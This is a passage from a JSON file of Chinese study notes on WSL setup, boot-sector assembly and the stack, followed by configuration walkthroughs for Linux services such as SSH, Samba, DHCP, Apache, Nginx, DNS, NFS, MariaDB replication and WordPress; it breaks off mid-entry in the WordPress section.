[
  {
    "id":-1,
    "updateDate": "",
    "specificTtime": "",
    "title": "404",
    "content": "也许这条笔记被删除了，或者是你搞错了，因为我们没有这条笔记。",
    "type": -1
  },
  {
    "id": 1,
    "updateDate": "2025年5月18日",
    "specificTtime": "16点22分",
    "title": "环境配置",
    "content": "<h2>通过WSL下载与运行Ubuntu系统</h2><p>在Powershell中，查询供下载的系统版本</p><pre><code>wsl --list --online</code></pre><p>在一般情况下，列出的系统与版本中，以下版本对于制作操作系统而言是稳定且值得下载的：</p><pre><code>Ubuntu-22.04                    Ubuntu 22.04 LTS</code></pre><p>下载Ubuntu-22.04，命令将会有要求输入的部分，请在输入后不要行动，查看接下来的解释：</p><pre><code>wsl --install -d Ubuntu-22.04</code></pre><p><strong>请看完后再行动：</strong>上面的命令用于下载22.04版本的Ubuntu，在这期间，将提示新建一个新的UNIX账户：这相当于是可以执行sudo的Ubuntu普通用户。按照要求输入之后，你可以看到供你输入命令的命令提示符的出现，请<strong>不要着急输入什么</strong>，只是等待十秒钟时间（通常其内部无需这么久来处理信息，只是保守一点的等待方法），随后关闭窗口或者输入<code>exit</code>。</p><p>虽然不是必须的，到这一步可以选择性将电脑重新启动，以应用WSL的变化。</p><p>重新启动之后再度进入Powershell，输入以下命令以启动Ubuntu-22.04（参数<code>-d</code>以开启指定系统）：</p><pre><code>wsl -d Ubuntu-22.04</code></pre><p>一般来说是可以正确进入Ubuntu操作系统的，现在我们可以将其设置为默认启动系统，以后仅需输入<code>wsl</code>即可开启它：</p><pre><code>wsl --set-default Ubuntu-22.04</code></pre><p>如果有多个Ubuntu实例，可以通过以下命令列出设备上已有的系统：</p><pre><code>wsl --list --verbose</code></pre><p>如果想要删掉某个系统实例，可以通过以下命令实现，<strong>删错无法恢复，需谨慎</strong>：</p><pre><code>wsl --unregister &lt;上一条命令中的NAME值&gt;</code></pre><p>没有特殊需求到这里就可以结束了。</p><h2>迁移Ubuntu系统实例</h2><p>由于WSL默认安装在C盘，对于想要节省C盘空间的人来说迁移Ubuntu系统到其他盘符显得尤为重要。</p><p>请先创建两个目录，目录A用于存放<code>导出后的Ubuntu的压缩包</code>，目录B用于存放<code>解压Ubuntu压缩包后的数据</code>，目录B装的是以后都要运行的系统实例，不能删除，目录A可以，因为只是导出的Ubuntu系统。</p><p>我们要先：导出指定Ubuntu系统实例为压缩包存放到目录A里。</p><p>随后需要：导入目录A中的Ubuntu系统实例压缩包，并作为新的实例，指定其实例名称，以及指定其存放位置为目录B</p><p>让我们开始迁移：</p><p>导出Ubuntu实例作为一个压缩包，将这个压缩包命名，随后指定这个压缩包放的地方为目录A：</p><pre><code>wsl --export Ubuntu-22.04 &lt;目录A的路径&gt;\\install.tar.gz</code></pre><p>导出完毕后，指定从目录A中导入压缩包，并作为新的Ubuntu实例，定义其名称和存放位置为目录B：</p><pre><code>wsl --import &lt;新的实例名称&gt; &lt;目录B的路径&gt; &lt;目录A的路径&gt;\\install.tar.gz</code></pre><p>在删除还存留在C盘的Ubuntu实例之前，建议先确认在迁移到其他盘符后的Ubuntu实例是可以正常运行的：</p><pre><code>wsl -d &lt;新的实例名称&gt;</code></pre><p>如果的确是可以正常运行的，即可删除还留存在C盘中的Ubuntu实例：</p><p>利用<code>wsl --list --verbose</code>查询所有可用实例，确认所要删除的实例，也就是除了&lt;新的实例名称&gt;以外的所有</p><p>利用<code>wsl --unregister &lt;上一条命令中的NAME值&gt;</code>以删除指定NAME的实例。</p><p>结束。</p>",
    "type": 0
  },
  {
    "id": 2,
    "updateDate": "2025年5月18日",
    "specificTtime": "13点19分",
    "title": "引导扇区文件",
    "content": "<h2>构建引导扇区文件(Boot sector)</h2><p>BIOS需要知道如何启动系统，所以它会将这个任务交给引导扇区文件执行，一个引导扇区文件有512字节。</p><p>我们将编写一个包含死循环的引导扇区文件，因为死循环所以它不会做任何事情，不过它会新建一个提示“Booting from Hard Disk...”的窗口，但是因为它是什么都不做的，所以永远不会有下一步。</p><h3>下载所需工具</h3><p>编辑<code>/etc/apt/sources.list</code>文件，将以下网络源替代该文件的所有原始内容：</p><pre><code>deb http://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiverse</code></pre><p>随后<code>apt update</code>应用更新，并下载所需要的工具：</p><pre><code>sudo apt install build-essential nasm git qemu-system-i386</code></pre><h3>开始编写</h3><p>新建工程文件，在其中新建一个以 <code>.asm</code> 为后缀的 汇编源文件，这将会作为我们什么都不做的引导扇区文件。</p><p>输入以下内容：</p><pre><code>loop:<br>&nbsp;&nbsp;&nbsp;&nbsp;jmp loop<br><br>times 510-($-$$) db 0<br>dw 0xaa55</code></pre><p>引导扇区文件规定：一个引导扇区文件的大小必须是512字节，除了在开头编写它真正要做的部分，其他都以<code>0</code>占空，最后末尾两位为“魔数”，BIOS将根据魔数来判断这个引导扇区是不是可引导的。</p><p><code>loop: jmp loop</code>是引导扇区真正做的事情：无限循环这个过程：<code>陷入循环，跳转到循环入口，陷入循环</code>，也就达到了我们“什么都不做”的目的。</p><p><code>times 510-($-$$) db 0</code>的作用是填补<code>0</code>：<code>($ - $$)</code>中的<code>$</code>为前面写了多少个字节，<code>$$</code>为文件的开头位置，这一般为0。所以<code>times</code>通过计算<code>510-($-$$)</code>后，这段代码将：偏移3个字节位置（<code>loop : jmp loop</code>占三个字节）也就是从<code>510-(3 - 0)</code>的下一个位置开始，到第510之间的所有空间都填补<code>0</code>。</p><p><code>dw 0xaa55</code> 的作用是在511和512的位置上分别写入<code>55</code>和<code>aa</code>，也被称之为魔数，它会将该扇区标记为合法引导扇区。</p><h3>编译</h3><p>将汇编文件（.asm）编译为二进制（.bin）：</p><pre><code>nasm -f bin &lt;asm文件&gt;.asm -o &lt;编译后新文件的名称&gt;.bin</code></pre><h3>运行</h3><pre><code>qemu-system-i386 -drive format=raw,file=&lt;编译后新文件的名称&gt;.bin</code></pre><p>正常情况下可以看到一个名为QEMU的新窗口弹出，并且一直显示“Booting from Hard Disk...”且没有下一步。</p><p>结束。</p>",
    "type": 0
  },
  {
    "id": 3,
    "updateDate": "2025年5月18日",
    "specificTtime": "13点21分",
    "title": "内存偏移量",
    "content": "<h2>内存偏移量</h2><p>设定内存偏移量是一串在汇编源代码文件中常见的代码，它在大多数情况下在汇编文件的第一行，并长这样：</p><pre><code>[org 0x7c00]</code></pre><p><code>0x7c00</code>是值，其代表内存偏移量究竟要偏移多少。<strong>请注意：</strong>这个值并不是想设置多少就设置多少的，它在大多数情况下值都是<code>0x7c00</code>。</p><p>设定内存偏移量的目的很简单，我们之前编写了一个什么都不做的引导扇区文件，它是汇编编写的，随后我们将其编译为了二进制文件，随后使用<code>qemu-system-i386</code>执行了编译后的二进制文件，这不是重点，请耐心看到后面。</p><p>我们现在有两个文件：汇编文件、引导扇区二进制文件。对于汇编文件而言，在不设定内存偏移量时，汇编器将默认认为程序是从内存位置<code>0x0000</code>开始运行，这样任何涉及到寻址的代码都将相对于<code>0x0000</code>找寻，一切都是正常的。而对于引导扇区二进制文件，BIOS将会把这个二进制文件直接copy paste到内存位置<code>0x7c00</code>后开始执行，对，如果这个时候不设定内存偏移量的话，汇编器将依然认为程序是从内存位置<code>0x0000</code>开始运行的，接下来任何涉及到寻址的代码都还会相对于<code>0x0000</code>找寻而不是<code>0x7c00</code>，这样的后果是找不到内容或者是找到垃圾内存，导致黑屏或者花屏，这也是为什么我说内存偏移量的值<code>它在大多数情况下值都是0x7c00</code>的原因。</p><p>我可以写一个执行过程图加深印象：</p><p><strong>汇编代码（不设定内存偏移量）</strong>：运行代码 -- 执行到需要去寻址的代码 -- 未检测到设定内存偏移量，汇编器将默认从<code>0x0000</code>开始寻址 -- 根据寻址标签的类型使用专门的计算方法，并在<code>内存偏移量</code>和<code>该标签距离文件头部的字节数</code>的参与下算出目标所处的内存位置 -- 得到值，继续执行 -- 没问题</p><p><strong>二进制代码（汇编未设定内存偏移量）</strong>：文件被BIOS copy paste到内存位置<code>0x7c00</code> -- 执行到需要去寻址的代码 -- 未检测到设定内存偏移量，汇编器将默认从<code>0x0000</code>开始寻址 -- 根据寻址标签的类型使用专门的计算方法，并在<code>内存偏移量</code>和<code>该标签距离文件头部的字节数</code>的参与下算出目标所处的内存位置 -- 找不到数据/找到的是垃圾内存 -- 无法正常执行</p><p><strong>如果设定了内存偏移量，并为<code>0x7c00</code>：</strong></p><p><strong>汇编代码</strong>：运行代码 -- 执行到需要去寻址的代码 -- 检测到内存偏移量被指定为<code>0x7c00</code>，汇编器将从<code>0x7c00</code>开始寻址 -- 根据寻址标签的类型使用专门的计算方法，并在<code>内存偏移量</code>和<code>该标签距离文件头部的字节数</code>的参与下算出目标所处的内存位置 -- 得到值，继续执行 -- 没问题</p><p><strong>二进制代码</strong>：文件被BIOS copy paste到内存位置<code>0x7c00</code> -- 执行到需要去寻址的代码 -- 检测到内存偏移量被指定为<code>0x7c00</code>，汇编器将从<code>0x7c00</code>开始寻址 -- 根据寻址标签的类型使用专门的计算方法，并在<code>内存偏移量</code>和<code>该标签距离文件头部的字节数</code>的参与下算出目标所处的内存位置 -- 得到值，继续执行 -- 没问题</p><p>说白了，<strong>内存偏移量的作用是使汇编和二进制文件的内存起点一致（都为<code>0x7c00</code> ）</strong></p><p>但你应该注意到我们之前的代码没有设定内存偏移量但依然可以执行，这是因为只有在使用了特定的代码，比如标签、跳转等功能时才会需要用到它，我们之前做的不过是一个死循环引导扇区文件，根本没有复杂到这个程度，所以才没有用到。不过这依然是一个很有用的东西，即使我们现在没有用到，但只要想做一个出色的系统，这肯定是会用到的。</p><p>结束。</p>",
    "type": 0
  },
  {
    "id": 4,
    "updateDate": "2025年5月18日",
    "specificTtime": "19点44分",
    "title": "栈",
    "content": "<h2>栈</h2><p>在此之前需要先知道一件事情：如果将内存大小之间的关系用图形表现出来的话，内存值大的在上，小的在下。</p><p>栈是一个容器，你可以对它进行存(压入/push)取(弹出/pop)操作，但是你必须要在操作栈前初始化它，与此同时，并且栈遵循先进后出原则（后面你将会理解什么是先进后出）。</p><p>你可以对栈压入一些数据，当你试图从栈中弹出值时，你只能得到最后一次压入栈的值，随后这个值会真的像从栈中”弹出来“一样，可以为你所用，但不再处于栈中，所以下一次你从栈中取值将会返回你倒数第二次压入的值。</p><p>初始化栈，也就是设置栈的起始位置，也就是“栈顶”：</p><pre><code>mov bp, 0x8000       ; 栈顶位置<br>mov sp, bp</code></pre><p>每个被存入栈的数据的大小<strong>都为2字节</strong>。</p><p>将值压入值到栈中：</p><pre><code>push 'A'</code></pre><p>弹出值并赐给寄存器<code>bx</code>：</p><pre><code>pop bx</code></pre><p>将返回最后一次压入的数据。假设我需要依次添加ABC指到栈中，流程和取值将会像这样：</p><p>压入A，此时栈中只有A一个元素，若此时需要取指则取A，因为A是最后一被压入的<br>压入B，此时栈中有A<br>B两个元素，若此时需要取指则取B，因为B是最后一被压入的<br>压入C，此时栈中有A<br>B<br>C三个元素，若此时需要取指则取C，因为C是最后一被压入的</p><p>每次取的值都为最后一次压入的，这也是为什么我前面说“栈遵循先进后出的原则”。</p><p>按照文档开头提到的道理，栈与代码之间的内存位置关系是：随着编写，代码的内存位置从0x7c00向上依次增大；栈随着被压入新值，新指的内存位置将从栈顶向下依次减小。</p><p>而如果栈中的数据量有那么大足以让代码的内存位置与栈最后一次压入的数据的内存位置相交，这将导致无法预料的错误发生。解决办法之一是将栈的顶部设置的更高，例如0x9000等，以避免两者之间的触碰。</p><p>对于构建一个成熟的操作系统，使用栈应该是必然的，它可以临时存值、传递参数给方法等，加上汇编并未高级到现代编程语言，没有其他正规的方法可以替代实现这些功能，因此学习它是有必要的。</p><p>结束。</p><h2>手算栈内数据的内存位置</h2><p>你可以这样计算栈中数据的内存位置：因为一个数据占两个字节，两个字节分别存放该数据的高八位和低八位，那么这个数据的内存位置则可以如此计算：</p><p><strong>高八位：</strong><code>栈顶 - 栈内数据个数*2 - 1</code><br><strong>低八位：</strong><code>栈顶 - 栈内数据个数*2 - 2</code></p><p>这是个例子：</p><pre><code>mov bp, 0x8000<br>mov sp, bp<br><br>push 'C' → 存在 0x7FFA ~ 0x7FFB<br>push 'B' → 存在 0x7FFC ~ 0x7FFD<br>push 'A' → 存在 0x7FFE ~ 0x7FFF</code></pre>",
    "type": 0
  },
  {
    "id": 5,
    "updateDate": "2025年5月18日",
    "specificTtime": "19点55分",
    "title": "结构化和杂项",
    "content": "<h2>结构化和杂项</h2><h3>include</h3><p>有些情况下，一段代码可能被多个文件使用，常规做法是将可能被多个文件使用的代码单独作为一个代码文件，在其他文件中引入它：</p><pre><code>%include \"filename\"</code></pre><p>这等同于C++的<code>#inclde \"filename\"</code>，<code>$</code>等同于<code>#</code>同为预处理指令。</p><h3>pusha和popa</h3><p>pusha和popa是相互搭配使用的，它们的作用是：保存寄存器的值和还原寄存器的值。</p><p>pusha用于将寄存器<code>ax, cx, dx, bx, sp, bp, si, di</code>依次压入栈中，这用于保存现场，假设进入了一个方法，而这些寄存器的值可能会在方法中被读取修改，而在方法的一开始（<code>start</code>中）pusha，这可以在一切操作之前保存原本的值。</p><p>popa用于将恢复那些寄存器的值，在方法执行完毕之后（<code>done</code>中）popa，可以将栈中保存的寄存器的值重新赋予那些寄存器，以达到寄存器在方法前方法后值不变、且不被污染的效果。</p><h3>cmp和je/jz、jne/jnz、jg、jl、ja、jb</h3><p>cmp和je/jz、jne/jnz、jg、jl、ja、jb是相互搭配使用的，它们的作用是：对两个值进行判断，并根据判断结果做不同的事情。</p><p>cmp接收两个值，他将使用第一个值减去第二个值，根据结果来设置对应的标准寄存器：</p><pre><code>cmp A, B</code></pre><p>顺带一提，除了两个值的位宽不一样（例如使用16位与8位进行判断）和直接用内存做比较，其他任何数据类型都可以相互比较，例如字符和数字一样可以，因为其他数据类型本质都是数字。</p><p>随后你可以使用<code>je/jz、jne/jnz、jg、jl、ja、jb</code>来进行判断，它们的具体含义是这样的：</p><pre><code>je/jz     相等<br>jne/jnz   不相等<br>jg        大于（有符号的）<br>jl        小于（有符号的）<br>ja        大于（无符号的）<br>jb        小于（无符号的）</code></pre><p><strong>什么是“有符号的”：</strong>判断时看不看两数的符号（就是负数的负号），用于A - B结果可能为负数的判断</p><p><strong>什么是“无符号的”：</strong>判断时不看符号（也就是负数的负号），用于A - B始终为正数的判断</p><p>关于如何具体如何判断，使用格式是这样：</p><pre><code>&lt;判断代码&gt; &lt;条件达成将执行的代码&gt;</code></pre><h3>jmp</h3><p>jmp用于跳转，格式如下：</p><pre><code>jmp &lt;跳转的位置&gt;</code></pre><p>跳转的位置可以是以下几种常见的位置：</p><p><code>$</code>：循环当前，死循环</p><p><code>标签</code>：假设你有一个方法：</p><pre><code>print:<br>&nbsp;&nbsp;&nbsp;&nbsp;...<br>start:<br>&nbsp;&nbsp;&nbsp;&nbsp;...<br>done:<br>&nbsp;&nbsp;&nbsp;&nbsp;...</code></pre><p>你可以跳转到<code>print</code>、<code>start</code>、<code>done</code></p><p>结束。</p>",
    "type": 0
  },
  {
    "id": 6,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点00分",
    "title": "SSH Service",
    "content": "<h2>systemctl开启ssh服务</h2><p>编辑<code>/etc/ssh/sshd_config</code></p><p>代码化line33，值改为yes<br>代码化line57，值改为yes</p><p>重启ssh服务</p><p>secureCRT选择ssh2模式连接kali，输入username和password即可</p><p>要传文件or下载文件，打开secureFX，sftp连接服务器ip即可</p>",
    "type": 1
  },
  {
    "id": 7,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点00分",
    "title": "OpenSSH Service",
    "content": "<h2>netstat 与 openssh 设置</h2><pre><code>netstat -nlpt</code></pre><p>列出所有正在监听、工作的TCP端口的服务</p><pre><code>dpkg -l openssh-server</code></pre><p>检查服务器是否安装了openssh-server服务</p><pre><code>/etc/ssh/sshd_config</code></pre><p>sshd配置文件路径</p><p><strong>【编辑/etc/ssh/sshd_config】</strong><br>line33【允许root远程登入】：代码化，将值改为yes<br>line38［是否利用公钥认证］：代码化<br>line57【开启密码验证】：代码化<br>line58【不允许空密码登入】：代码化</p><p>重启ssh.service服务</p><pre><code>systemctl enable ssh.service</code></pre><p>设定开机自启</p><pre><code>ssh &lt;登入的用户名&gt;@&lt;服务器IP地址&gt;</code></pre><p>客户端连线数据库</p><h3>免密登入：</h3><p><strong>客户机：</strong></p><pre><code>ssh-keygen -t rsa</code></pre><p>通过非对称加密算法（rsa），生成密钥公钥<br>输入信息后回车即可</p><p>生成的两个证书位于<code>/root/.ssh</code>下，<code>.pub</code>为公钥，无后缀为私钥</p>",
    "type": 1
  },
  {
    "id": 8,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点00分",
    "title": "Samba Service",
    "content": "<h2>Samba 安装与配置</h2><pre><code>yum install samba samba-client</code></pre><p>下载samba</p><pre><code>vim /etc/samba/smb.conf</code></pre><p>在<code>global</code>下添加/修改：</p><pre><code>workgroup = 工作组名<br>netbios name = 网络名<br>map to guest = Bad user<br>host allow = 192.168.100. 可访问网段</code></pre><p><code>[publicinfo]</code></p><pre><code>comment = public info documents<br>path = /var/public<br>browseable = yes<br>piblic = yes</code></pre><p>重启服务，<code>restart smb</code></p><p>防火墙添加例外服务并重启：</p><pre><code>firewall-cmd --add-service=samba --permanent<br>firewall-cmd --reload</code></pre>",
    "type": 1
  },
  {
    "id": 9,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点00分",
    "title": "DHCP Service",
    "content": "<h2>DHCP 安装与配置</h2><pre><code>yum install dhcp</code></pre><p>下载dhcp包</p><pre><code>/etc/dhcp/dhcpd.conf</code></pre><p>进入配置文件</p><pre><code>:r /use/share/doc/dhcp-4.2.5/dhcpd.conf.example</code></pre><p>以将模板copy到此文本中后，加以编辑：</p><p><strong>主要修改line46-54：</strong></p><pre><code>line46：subnet 后接网段，netmask 后接子网掩码<br>line47：range 初始ip 结束ip，以设置可分配的ip，可以多写以排除ip<br>line49：option domain-name-servers DNS服务器地址<br>line51：option routers 网关地址<br>line52：广播地址</code></pre><p><strong>line74-76：设定保留地址</strong></p><pre><code>line74：设定保留地址实例名<br>line75：设定赐予保留地址的机器mac<br>line76：设定赐予机器的ip</code></pre><p>需要确保网卡网段和配置的dhcp池一样</p><p><strong>如果出错：</strong>关掉除了ens33其他所有网卡（尤其是以<code>v</code>开头的那个）</p>",
    "type": 1
  },
  {
    "id": 10,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点00分",
    "title": "Apache Web Service",
    "content": "<h2>Apache 安装与配置</h2><pre><code>apt search Apache<br>dpkg -l | grep apache</code></pre><p>查询Apache软件包</p><pre><code>apt-get install Apache2</code></pre><p>安装它</p><p><strong>主配置文件：</strong><br><code>/etc/apache2/apache2.conf</code></p><p><strong>端口配置文件：</strong><br><code>/etc/apache2/ports.conf</code></p><p><strong>虚拟主机文件目录（如需应用需要连接到<code>/etc/apache2/sites-enabled</code>下）：</strong><br><code>/etc/apache2/sites-available/</code></p><p><strong>==【配置步骤】==</strong></p><p>编辑站点配置文件<code>/etc/apache2/sites-enabled/000-default.conf</code>：</p><pre><code>line12：设定主目录<br>（无法设置默认档案）</code></pre><p>编辑<code>/etc/apache2/apache2.conf</code>：</p><pre><code>line170：主目录<br>line173：require all granted 允许所有人访问</code></pre><p>重启服务即可生效</p>",
    "type": 1
  },
  {
    "id": 11,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点00分",
    "title": "Apache Web Service(多开)",
    "content": "<h2>Apache 多站点监听与配置</h2><p><strong>*站点监听端口不可重复。</strong></p><ol><li>设置站点监听端口</li><li>新建站点配置文件</li><li>编辑站点配置文件</li><li>设置站点访问权限</li><li>生效站点配置文件</li><li>验证</li></ol><p><strong>【设置站点监听端口】</strong><br>进入<code>/etc/apache2/ports.conf</code></p><pre><code>Listen &lt;PORT&gt;</code></pre><p>新增行并添加需要监听的所有端口</p><p><strong>【新建站点配置文件】</strong><br>进入<code>/etc/apache2/sites-available</code></p><pre><code>cp 000-default.conf 新站点配置文件</code></pre><p>以<code>000-default.conf</code> 作为模板，新建站点配置文件</p><p><strong>【编辑站点配置文件】</strong><br>进入刚才建立的站点配置文件</p><pre><code>以下行号以删去所有注释空行保留为准<br>line1：&lt;VirtualHost *:监听端口&gt;<br>line4：DocumentRoot 站点主目录</code></pre><p><strong>【设置站点文件授权访问权限】</strong><br>编辑<code>/etc/apache2/apache2.conf</code></p><pre><code>line170~174：复制并在后粘贴</code></pre><pre><code>&lt;Directory 站点主目录&gt;<br>...<br>&lt;/Directory&gt;</code></pre><p>修改目录为站点主目录，以将规则生效到站点目录文件上</p><p><strong>【生效站点配置文件】</strong><br>进入<code>/etc/apache2/sites-enabled</code>，此时需确保apache2服务生效。</p><pre><code>a2ensite 站点配置文件</code></pre><p>将配置文件连接到enabled文件夹下以生效<br><strong>*此处无需提供站点配置文件路径</strong></p><p>重启apache2服务以令功能实现</p><p><strong>【验证】</strong></p><pre><code>http://ip:端口</code></pre><p>确认网站正确无误</p>",
    "type": 1
  },
  {
    "id": 12,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点00分",
    "title": "DNS Service(正向解析)",
    "content": "<h2>DNS 安装与配置</h2><h3>【install】</h3><pre><code>yum install -y bind</code></pre><p>安装dns服务</p><h3>【编辑配置文件】</h3><pre><code>/etc/named.conf</code></pre><p>line13+21：为了给所有主机提供DNS服务，分号中网段改成<code>any</code>;</p><pre><code>/etc/named.rfc1912.zones</code></pre><p>line13：将双引号中替换为要解析的域名<br>line15：解析文件名，格式为“域名.zone”，例如“abc.com.zone”</p><h3>【创建域名配置文件】</h3><p>进入<code>/var/named</code></p><pre><code>cp -p named.localhost 域名.zone</code></pre><p>将模板当作域名配置文件再编辑，由于属性关系要保留属性。<br><strong>注释：</strong>复制粘贴<code>named.localhost</code>更名为<code>域名.zone</code>并保留属性<br><strong>注意：</strong><code>域名.zone</code>要在<code>/var/named</code>文件夹下</p><p>进入<code>域名.zone</code></p><pre><code>{只写主机名：”主机名.域名.com”} IN {记录类型，例如A} {映射到的IP}</code></pre><p>最后一行新增映射记录</p><p>客户机用<code>nslookup</code>查询</p>",
    "type": 1
  },
  {
    "id": 13,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点08分",
    "title": "Nginx Web Service",
    "content": "<h2>Nginx 安装与多虚拟主机配置</h2><h3>【确认安装】</h3><pre><code>dpkg -l nginx</code></pre><h3>【配置文件所处目录】</h3><pre><code>/etc/nginx</code></pre><h3>【编辑虚拟主机配置文件】</h3><pre><code>/etc/nginx/sites-available/default</code></pre><pre><code>line22：设定监听端口<br>line23：设定ipv6监听端口（估计是这个意思）<br>line41：网站主目录<br>line44：默认主页文件，可添加<br>line46：域名（这是需要DNS的，如果没有可以修改client的/etc/hosts实现）</code></pre><p>重启nginx以生效</p><h3>=*【多个网站服务】*=</h3><h4>【创建虚拟主机配置文件】</h4><pre><code>cp sites-available/default sites-available/虚拟主机文件.conf</code></pre><p>以<code>default</code>作为模板，新增<code>.conf</code>文件</p><h4>【编辑虚拟主机配置文件】</h4><p>需要注意：</p><pre><code>line22：删去 default_server<br>line23：删去 default_server</code></pre><h4>【生效虚拟主机配置文件】</h4><pre><code>/etc/nginx/sites-enabled</code></pre><pre><code>ln -s 虚拟主机配置文件</code></pre><p>软链接到<code>sites-enabled</code>目录中</p><p>重启服务</p>",
    "type": 1
  },
  {
    "id": 14,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点08分",
    "title": "Nginx Web Service",
    "content": "<h2>Nginx 安装与多虚拟主机配置</h2><h3>【确认安装】</h3><pre><code>dpkg -l nginx</code></pre><h3>【配置文件所处目录】</h3><pre><code>/etc/nginx</code></pre><h3>【编辑虚拟主机配置文件】</h3><pre><code>/etc/nginx/sites-available/default</code></pre><pre><code>line22：设定监听端口<br>line23：设定ipv6监听端口（估计是这个意思）<br>line41：网站主目录<br>line44：默认主页文件，可添加<br>line46：域名（这是需要DNS的，如果没有可以修改client的/etc/hosts实现）</code></pre><p>重启nginx以生效</p><h3>=*【多个网站服务】*=</h3><h4>【创建虚拟主机配置文件】</h4><pre><code>cp sites-available/default sites-available/虚拟主机文件.conf</code></pre><p>以<code>default</code>作为模板，新增<code>.conf</code>文件</p><h4>【编辑虚拟主机配置文件】</h4><p>需要注意：</p><pre><code>line22：删去 default_server<br>line23：删去 default_server</code></pre><h4>【生效虚拟主机配置文件】</h4><pre><code>/etc/nginx/sites-enabled</code></pre><pre><code>ln -s 虚拟主机配置文件</code></pre><p>软链接到<code>sites-enabled</code>目录中</p><p>重启服务</p>",
    "type": 1
  },
  {
    "id": 15,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点08分",
    "title": "NFS共享文件服务",
    "content": "<h2>NFS 共享文件服务配置</h2><p><strong>前提条件：</strong><br>在服务端与客户端均使用 <code>yum</code> 安装 <code>nfs-utils</code> 与 <code>rpcbind</code> 服务：</p><pre><code>yum install -y nfs-utils rpcbind</code></pre><h3>一、服务端配置</h3><p><strong>编辑共享配置文件：</strong></p><pre><code>/etc/exports</code></pre><p>添加如下格式配置：</p><pre><code>&lt;共享目录路径&gt; &lt;网段&gt;/24(&lt;权限选项&gt;,no_root_squash,no_all_squash,async,anonuid=&lt;匿名UID&gt;,anongid=&lt;匿名GID&gt;)</code></pre><p>示例：</p><pre><code>/var/nfs_share 192.168.1.0/24(rw,no_root_squash,no_all_squash,async,anonuid=1000,anongid=1000)</code></pre><p><strong>重新导出配置：</strong></p><pre><code>exportfs -r</code></pre><p><strong>启动服务（NFS 依赖 RPC，必须先启 RPC）：</strong></p><pre><code>systemctl start rpcbind<br>systemctl start nfs</code></pre><h3>二、客户端挂载验证</h3><p><strong>挂载共享目录：</strong></p><pre><code>mount -t nfs &lt;NFS服务器IP&gt;:&lt;共享路径&gt; &lt;本地挂载目录&gt;</code></pre><p>示例：</p><pre><code>mount -t nfs 192.168.1.100:/var/nfs_share /mnt/share</code></pre><p>至此，客户端即可访问服务端共享目录内容。</p>",
    "type": 1
  },
  {
    "id": 16,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点08分",
    "title": "MariaDB从属配置",
    "content": "<h2>在 CentOS 上配置 MariaDB 主从复制</h2><p>MariaDB 主从复制用于在多台数据库服务器间同步数据，常用于负载均衡或数据备份。</p><h3>一、主服务器配置</h3><p><strong>1. 编辑配置文件：</strong></p><pre><code>sudo vi /etc/my.cnf<br># 或 sudo vi /etc/my.cnf.d/mariadb.conf.d/50-server.cnf</code></pre><p>在 <code>[mysqld]</code> 区块添加：</p><pre><code>[mysqld]<br>log-bin = mysql-bin<br>server-id = 1<br>binlog-format = mixed</code></pre><p><em>注意：</em>server-id 必须唯一。</p><p><strong>2. 重启 MariaDB：</strong></p><pre><code>sudo systemctl restart mariadb</code></pre><p><strong>3. 创建复制用户：</strong></p><pre><code>mysql -u root -p<br>CREATE USER 'replica'@'%' IDENTIFIED BY 'replica_password';<br>GRANT REPLICATION SLAVE ON *.* TO 'replica'@'%';<br>FLUSH PRIVILEGES;</code></pre><p><strong>4. 获取主状态信息：</strong></p><pre><code>SHOW MASTER STATUS;</code></pre><p>记录 <code>File</code> 和 <code>Position</code> 字段，如：</p><pre><code>File: mysql-bin.000001<br>Position: 120</code></pre><h3>二、从服务器配置</h3><p><strong>1. 编辑配置文件：</strong></p><pre><code>sudo vi /etc/my.cnf<br># 或 sudo vi /etc/my.cnf.d/mariadb.conf.d/50-server.cnf</code></pre><p>添加：</p><pre><code>[mysqld]<br>server-id = 2</code></pre><p><strong>2. 重启服务：</strong></p><pre><code>sudo systemctl restart mariadb</code></pre><p><strong>3. 设置主服务器连接信息：</strong></p><pre><code>mysql -u root -p<br>CHANGE MASTER TO<br>&nbsp;&nbsp;&nbsp;&nbsp;MASTER_HOST = '主服务器IP地址',<br>&nbsp;&nbsp;&nbsp;&nbsp;MASTER_USER = 'replica',<br>&nbsp;&nbsp;&nbsp;&nbsp;MASTER_PASSWORD = 'replica_password',<br>&nbsp;&nbsp;&nbsp;&nbsp;MASTER_LOG_FILE = 'mysql-bin.000001',<br>&nbsp;&nbsp;&nbsp;&nbsp;MASTER_LOG_POS = 120;</code></pre><p><strong>4. 启动复制：</strong></p><pre><code>START SLAVE;</code></pre><p><strong>5. 验证状态：</strong></p><pre><code>SHOW SLAVE STATUS\\G</code></pre><p>确保 <code>Slave_IO_Running</code> 与 <code>Slave_SQL_Running</code> 均为 <code>Yes</code></p><h3>三、验证复制效果</h3><p>在主服务器创建数据库或表插入数据，然后在从服务器查询验证是否同步。</p><p><strong>至此，MariaDB 主从复制配置完成。</strong></p>",
    "type": 1
  },
  {
    "id": 17,
    "updateDate": "2025年5月18日",
    "specificTtime": "20点08分",
    "title": "WordPress配置",
    "content": "<h2>在 CentOS 上安装和配置 WordPress</h2><h3>1. 准备环境</h3><p>确保已安装以下组件：</p><ul><li>Web 服务器：Apache 或 Nginx</li><li>PHP（7.4+）</li><li>MySQL / MariaDB</li></ul><pre><code>sudo yum install httpd mariadb-server php php-mysqlnd php-fpm php-xml php-mbstring php-json php-common php-cli php-zip</code></pre><h3>2. 配置数据库</h3><pre><code>sudo systemctl start mariadb<br>sudo systemctl enable mariadb</code></pre><p>登录 MariaDB 并创建数据库：</p><pre><code>mysql -u root -p<br>CREATE DATABASE wordpress DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;<br>CREATE USER 'wp_user'@'localhost' IDENTIFIED BY 'password';<br>GRANT ALL PRIVILEGES ON wordpress.* TO 'wp_user'@'localhost';<br>FLUSH 